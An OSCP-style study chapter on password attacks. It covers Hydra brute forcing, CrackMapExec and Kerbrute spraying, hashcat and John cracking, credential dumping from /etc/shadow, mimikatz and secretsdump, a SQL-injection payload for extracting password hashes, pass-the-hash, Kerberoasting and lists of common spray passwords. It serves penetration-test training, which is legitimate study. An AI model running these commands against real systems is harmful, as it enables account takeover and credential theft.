# 07 — Password Attacks

Password attacks are either **online** (trying passwords against a live service like SSH or a web login) or **offline** (cracking hashes you've already obtained from a database dump or SAM file). Both are essential for the OSCP — you'll brute force logins, crack extracted hashes, and spray passwords across Active Directory.

---

## Online Attacks — Brute Forcing Live Services

### Hydra — the standard brute force tool

Hydra connects to a service and tries username/password combinations from wordlists.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4 -f
```

**Breaking down every piece:**

```
hydra                   The tool
-l admin                Lowercase L = single username to try ("admin")
-P rockyou.txt          Uppercase P = password wordlist file (try every password in this file)
ssh://TARGET            The service and target IP (protocol://IP)
-t 4                    Number of threads (parallel connections)
                        4 is safe for SSH — higher might trigger lockouts or rate limiting
-f                      Stop after the FIRST valid login (don't keep trying)
```

**What Hydra actually does:**

```
Connection 1: tries admin:123456
Connection 2: tries admin:password
Connection 3: tries admin:12345678
Connection 4: tries admin:qwerty
...waits for responses...
Connection 1 failed → tries admin:abc123
Connection 2 failed → tries admin:monkey
...continues until a login succeeds or the wordlist is exhausted
```

### Hydra flags — complete reference

| Flag | What it does | Example |
|---|---|---|
| `-l username` | Single username (lowercase L) | `-l admin` |
| `-L file.txt` | Username list file (uppercase L) | `-L users.txt` |
| `-p password` | Single password (lowercase P) | `-p password123` |
| `-P file.txt` | Password list file (uppercase P) | `-P rockyou.txt` |
| `-t N` | Number of threads | `-t 4` (safe), `-t 16` (aggressive) |
| `-f` | Stop after first valid login | Always use this |
| `-F` | Stop after first valid login on ANY host | For multiple targets |
| `-s PORT` | Non-standard port | `-s 2222` (SSH on port 2222) |
| `-V` | Verbose (show every attempt) | Useful for debugging |
| `-vV` | Very verbose | Shows even more detail |
| `-o file.txt` | Save results to file | `-o hydra_results.txt` |
| `-e nsr` | Try: n=null password, s=same as username, r=reversed username | `-e nsr` |
| `-M file.txt` | List of target hosts | For spraying across machines |

### Hydra for each service

**SSH:**
```bash
# Single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.244.132 -t 4 -f

# Multiple users, password list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.244.132 -t 4 -f

# Non-standard port
hydra -l admin -P rockyou.txt ssh://192.168.244.132 -s 2222 -t 4 -f
```

**FTP:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.244.132 -t 4 -f
```

**RDP:**
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.244.135 -t 4
# RDP is slow — use a smaller wordlist
```

**SMB:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.244.132 -t 4 -f
# Or use CrackMapExec (better for SMB)
```

**MySQL:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.244.132 -t 4 -f
```

**HTTP Basic Auth (the popup login box):**
```bash
hydra -l admin -P rockyou.txt http-get://192.168.244.132/admin
# http-get = HTTP Basic Authentication on a GET request
```

### HTTP POST form brute force — the tricky one

Web login forms use POST requests. You need to tell Hydra the form parameters and what a failed login looks like.

**Step 1: Examine the login form**

```bash
curl -s http://TARGET/login.php | grep -iE "form|input|name="
```

You see something like:
```html
<form action="/login.php" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Login</button>
</form>
```

**Step 2: Try a login and note the failure message**

```bash
curl -X POST http://TARGET/login.php -d "username=admin&password=wrong"
```

Response includes: `Invalid username or password`

**Step 3: Build the Hydra command**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.244.132 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password" -t 4 -f
```

**Breaking down the HTTP form string:**

```
"/login.php:username=^USER^&password=^PASS^:Invalid username or password"
 │           │                                │
 │           │                                └── FAILURE STRING: Hydra sees this text = failed login
 │           └── POST DATA: ^USER^ and ^PASS^ get replaced with each attempt
 └── URL PATH: where the login form submits to
```

The three parts are separated by colons (`:`):
```
Part 1: /login.php                                    (URL path)
Part 2: username=^USER^&password=^PASS^               (POST body — form fields)
Part 3: Invalid username or password                   (text that appears on FAILED login)
```

**How Hydra knows a login SUCCEEDED:** When the response does NOT contain the failure string. If you log in with correct credentials and the page says "Welcome" instead of "Invalid username or password," Hydra knows the password worked.

**Common mistake:** If your failure string is too generic (like "login"), it might match on the success page too, and Hydra never finds valid credentials. Use the EXACT failure message.

### CrackMapExec — better for Windows/AD brute forcing

```bash
# SMB brute force
crackmapexec smb TARGET -u admin -p /usr/share/wordlists/rockyou.txt

# Password spraying (one password, many users)
crackmapexec smb TARGET -u users.txt -p 'Password1!' --continue-on-success

# Test credentials across multiple machines at once
crackmapexec smb 192.168.244.0/24 -u admin -p 'Password1!'
# Machines showing [+] and (Pwn3d!) = you have admin access

# WinRM brute force
crackmapexec winrm TARGET -u admin -p /usr/share/wordlists/rockyou.txt
```

**Why CrackMapExec over Hydra for SMB/WinRM:**
- Better error handling for Windows protocols
- Shows whether you have admin access (Pwn3d!)
- Can test credentials across an entire subnet
- Integrates with other post-exploitation features

### Kerbrute — Active Directory brute forcing

```bash
# Enumerate valid usernames (no lockout, fast)
kerbrute userenum -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc DC_IP

# Password spray (one password, all users)
kerbrute passwordspray -d corp.local users.txt 'Welcome2026!' --dc DC_IP

# Brute force a single user
kerbrute bruteuser -d corp.local /usr/share/wordlists/rockyou.txt admin --dc DC_IP
```

**Why Kerbrute over Hydra for AD:**
- Uses Kerberos protocol (faster than SMB)
- Doesn't generate Windows Event Log entries like SMB does
- Can enumerate valid usernames without any credentials

### When to brute force vs when to move on

```
DO brute force when:
  ✓ You have a valid username and need the password
  ✓ You're using a small targeted list (top 1000, not rockyou)
  ✓ The password policy allows it (no lockout or threshold > 10)
  ✓ The service responds quickly (SSH, web forms)
  ✓ You've exhausted other enumeration options

DON'T brute force when:
  ✗ You've been at it for more than 15-20 minutes with no results
  ✗ Account lockout policy is strict (3-5 attempts)
  ✗ There's an easier path you haven't tried (default creds, SQLi)
  ✗ The service is slow (RDP brute force takes forever)
  ✗ You don't have a valid username yet (username + password = exponentially slower)
```

---

## Offline Attacks — Cracking Hashes

### Step 1: Identify the hash type

Before you can crack a hash, you need to know what type it is. Different hash types need different cracking modes.

```bash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: [+] MD5, [+] MD4, [+] Double MD5, ...
# The first suggestion is usually correct

hashid '$6$salt$longhashstring'
# Output: [+] SHA-512 Crypt
# The $6$ prefix identifies it immediately
```

**How to identify common hashes by sight:**

| What you see | Hash type | Hashcat mode | Where you find it |
|---|---|---|---|
| 32 hex characters | MD5 or NTLM | `-m 0` (MD5) or `-m 1000` (NTLM) | Web databases / Windows SAM |
| 40 hex characters | SHA1 | `-m 100` | Web databases |
| 64 hex characters | SHA256 | `-m 1400` | Modern web apps |
| Starts with `$1$` | MD5crypt | `-m 500` | Old Linux /etc/shadow |
| Starts with `$5$` | SHA-256crypt | `-m 7400` | Linux /etc/shadow |
| Starts with `$6$` | SHA-512crypt | `-m 1800` | Modern Linux /etc/shadow |
| Starts with `$2y$` or `$2b$` | bcrypt | `-m 3200` | WordPress, modern apps |
| Starts with `$krb5tgs$` | Kerberos TGS | `-m 13100` | Kerberoasting output |
| Starts with `$krb5asrep$` | Kerberos AS-REP | `-m 18200` | AS-REP Roasting output |
| `aad3b435b51404ee:HASH` format | LM:NTLM | `-m 1000` (NTLM part) | secretsdump output |

**MD5 vs NTLM disambiguation:** Both are 32 hex characters. The context tells you which:
```
Found in a web application database → MD5 (mode 0)
Found from Windows SAM dump or secretsdump → NTLM (mode 1000)
Found from mimikatz → NTLM (mode 1000)
Format is "LM_HASH:NTLM_HASH" → NTLM (mode 1000, use the part after the colon)
```

### Step 2: Crack with hashcat (GPU-accelerated — fastest)

```bash
hashcat -m MODE hash_file /usr/share/wordlists/rockyou.txt
```

**Breaking it down:**

```
hashcat                 The tool (uses your GPU for massive parallelism)
-m MODE                 The hash mode number (tells hashcat what algorithm to use)
hash_file               File containing the hash(es) to crack — one per line
/usr/share/.../rockyou  The wordlist (dictionary of passwords to try)
```

**What hashcat does internally:**

```
For each word in rockyou.txt:
  1. Hash the word using the specified algorithm (e.g., MD5)
  2. Compare the result to your hash
  3. If they match → the word is the plaintext password

Example with MD5 (mode 0):
  Word: "password123"
  MD5("password123") = 482c811da5d5b4bc6d497ffa98491e38
  Your hash:         = 482c811da5d5b4bc6d497ffa98491e38
  MATCH → password is "password123"
```

### hashcat with rules (crack harder passwords)

A wordlist contains exact words. Rules MUTATE each word into variations:

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**What rules do to each word:**

```
Original word: password

With best64.rule, hashcat also tries:
  Password    (capitalize first letter)
  PASSWORD    (all caps)
  password1   (append 1)
  password!   (append !)
  drowssap    (reverse)
  p@ssword    (leet speak: a→@)
  passw0rd    (leet speak: o→0)
  password123 (append 123)
  1password   (prepend 1)
  ... and 50+ more mutations per word
```

A 14-million-word wordlist × 64 rules = 896 million password attempts from one wordlist.

**Common rule files:**

```
/usr/share/hashcat/rules/best64.rule         64 rules — good balance
/usr/share/hashcat/rules/rockyou-30000.rule  30,000 rules — comprehensive but slow
/usr/share/hashcat/rules/d3ad0ne.rule        34,000 rules — aggressive
/usr/share/hashcat/rules/dive.rule           99,000 rules — overkill for most situations
```

### hashcat useful flags

```bash
hashcat -m 1000 hashes.txt rockyou.txt --show    # show already-cracked hashes
hashcat -m 1000 hashes.txt rockyou.txt --force   # force run even with warnings
hashcat -m 1000 hashes.txt rockyou.txt -O        # optimized kernels (faster)
hashcat -m 1000 hashes.txt rockyou.txt -w 3      # workload profile 3 (aggressive)
```

### Step 3: Crack with John the Ripper (CPU-based — works everywhere)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

John auto-detects the hash type from the format (especially Linux shadow hashes with $6$ prefix). If it guesses wrong:

```bash
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
john --format=nt --wordlist=rockyou.txt hashes.txt
john --format=sha512crypt --wordlist=rockyou.txt hashes.txt
```

```bash
# Show cracked results
john --show hashes.txt
```

### Cracking special file types with john

John has helper tools that extract hashes from protected files:

```bash
# SSH private key passphrase
ssh2john id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt

# ZIP file password
zip2john protected.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt

# KeePass database master password
keepass2john database.kdbx > kp_hash.txt
john --wordlist=rockyou.txt kp_hash.txt

# Office document password
office2john document.docx > office_hash.txt
john --wordlist=rockyou.txt office_hash.txt

# Linux shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt

# Show cracked passwords
john --show ssh_hash.txt
john --show zip_hash.txt
```

---

## Where You Find Hashes (extraction methods)

### Linux

```bash
# /etc/shadow (need root access)
sudo cat /etc/shadow
# root:$6$salt$hash:19500:0:99999:7:::

# Prepare for cracking
sudo unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
# or
# Extract just the hash line and use hashcat -m 1800
```

### Windows — Local accounts (SAM database)

```bash
# From mimikatz (on the Windows target)
mimikatz# lsadump::sam
# Dumps: Administrator:500:aad3b435:NTLM_HASH:::

# From impacket (remotely, need admin creds)
impacket-secretsdump administrator:'Password1!'@TARGET
# or with hash
impacket-secretsdump administrator@TARGET -hashes aad3b435:NTLM_HASH

# From registry backup files (if found)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Crack the NTLM hashes
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# OR don't crack — just pass the hash
impacket-psexec administrator@TARGET -hashes aad3b435:NTLM_HASH
evil-winrm -i TARGET -u administrator -H NTLM_HASH
```

### Web application databases (via SQLi)

```sql
-- MySQL
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--

-- The extracted hashes might be MD5, SHA1, SHA256, or bcrypt
-- Identify the type, then crack with hashcat
```

### Kerberos (Active Directory)

```bash
# Kerberoasting → TGS hashes (mode 13100)
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting → AS-REP hashes (mode 18200)
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Password Spraying

**What it is:** Try ONE password against MANY users. This avoids account lockout (which triggers after too many failed attempts for ONE account).

```bash
# With CrackMapExec (best for AD)
crackmapexec smb DC_IP -u users.txt -p 'Password1!' --continue-on-success

# With Kerbrute (stealthier, uses Kerberos)
kerbrute passwordspray -d domain.local users.txt 'Password1!' --dc DC_IP

# Common corporate passwords to spray
Password1!
Welcome1!
Company2026!         # company name + year
Summer2026!          # season + year
Winter2026!
P@ssw0rd
Passw0rd!
CompanyName1!
```

**Always check the password policy first:**
```bash
crackmapexec smb DC_IP -u '' -p '' --pass-pol
# Lockout Threshold: 0 → no lockout, spray freely
# Lockout Threshold: 5 → only try 4 passwords per user
```

---

## Custom Wordlists

### cewl — generate wordlists from a website

```bash
cewl http://TARGET -w custom_wordlist.txt -d 2 -m 5
```

| Flag | What it does |
|---|---|
| `-w file` | Write output to file |
| `-d 2` | Spider depth (follow links 2 levels deep) |
| `-m 5` | Minimum word length (skip short words) |

**Why this is useful:** Company websites contain company-specific words (product names, department names, city names) that people use in passwords. A custom wordlist of these words + hashcat rules catches passwords like `CompanyName2026!` that generic wordlists miss.

### Combining wordlists with hashcat rules

```bash
# Generate the custom wordlist
cewl http://TARGET -w custom.txt -d 2 -m 5

# Use it with rules to generate mutations
hashcat -m 1000 hashes.txt custom.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Exam Tips

1. **Try default credentials BEFORE brute forcing.** `admin:admin`, `admin:password`, `root:root`, the application name as both fields. 30 seconds vs 30 minutes.

2. **Use small wordlists first.** `top-1000.txt` before `rockyou.txt`. If it's not in the top 1000, it might not be brute-forceable.

3. **Check for credential reuse everywhere.** Every password you find: try it on SSH, RDP, WinRM, SMB, web logins, and every other machine. `crackmapexec smb 192.168.X.0/24 -u user -p found_password`.

4. **Don't brute force for more than 15-20 minutes.** If it's not cracking, the path is probably not brute force.

5. **Pass the hash instead of cracking.** If you dump NTLM hashes, try PtH first. Cracking takes time — PtH is instant.

6. **Kerberoast immediately** when you get any domain credentials. Service accounts often have weak passwords.

7. **For HTTP forms, get the failure string right.** A wrong failure string means Hydra never reports a valid login even if it finds one.
